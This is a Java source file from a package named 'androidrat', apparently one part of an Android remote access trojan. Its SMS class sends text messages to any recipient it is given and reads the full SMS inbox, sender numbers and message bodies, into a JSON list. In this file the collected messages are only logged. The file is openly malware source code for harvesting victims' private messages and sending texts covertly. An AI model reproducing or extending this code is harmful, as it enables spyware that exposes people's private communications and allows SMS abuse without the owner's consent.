package com.ot.androidrat;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMS {

    public void sendSMS(String message, String recipient){
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(recipient, null, message, null, null);
    }

    public void readSMS(){
        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = new MainActivity().getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo" , address);
                sms.put("msg" , body);
                list.put(sms);

            }
            SMSList.put("smsList", list);
            Log.i("done" ,"collecting");
            Log.i("Result", SMSList.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

}
